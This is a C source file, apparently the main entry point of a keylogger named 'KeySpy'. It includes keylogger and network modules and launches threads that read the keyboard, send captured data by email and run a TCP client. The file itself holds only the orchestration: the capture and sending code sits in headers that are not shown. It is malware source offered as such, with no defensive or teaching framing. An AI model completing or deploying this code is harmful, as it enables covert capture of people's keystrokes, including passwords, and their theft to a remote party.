#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <unistd.h>
#include <locale.h>
#include "core_state.h"
#include "utils/helpers.h"
#include "keylogger/keylogger.h"
#include "network/network.h"

int main() {
    HandlerContext context;
    pthread_t thread_read, thread_send_email, thread_network;
    void *retval_read, *retval_send, *retval_net;
    int code_read, code_send, code_net;
    char time_str[9];

    setlocale(LC_ALL, "");
    get_current_time(time_str, sizeof(time_str));
    printf("KeySpy started: %s\n", time_str);

    if (init_state()){
        return EXIT_FAILURE;
    }

    if (context_init(&context)) {
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    if (pthread_create(&thread_read, NULL, read_keyboard, &context)){
        fprintf(stderr, "pthread (pthread_read) create failed");
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    if (pthread_create(&thread_send_email, NULL, send_email, &context)){
        fprintf(stderr, "pthread (pthread_send_email) create failed");
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    if (pthread_create(&thread_network, NULL, tcp_client_thread, NULL)){
        fprintf(stderr, "pthread (pthread_network) create failed");
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    pthread_join(thread_send_email, &retval_send);
    pthread_join(thread_read, &retval_read);
    pthread_join(thread_network, &retval_net);

    code_send = (int)(intptr_t)retval_send;
    code_read = (int)(intptr_t)retval_read;
    code_net = (int)(intptr_t)retval_net;

    printf("Thread send email exit, value %d\n", code_send);
    printf("Thread read keyboard exit, value %d\n", code_read);
    printf("Thread tcp_client_thread exit, value %d\n", code_net);

    context_cleanup(&context);
    close(pipe_fd_email[0]);
    close(pipe_fd_email[1]);
    close(pipe_fd_network[0]);
    close(pipe_fd_network[1]);

    return code_read || code_send || code_net;
}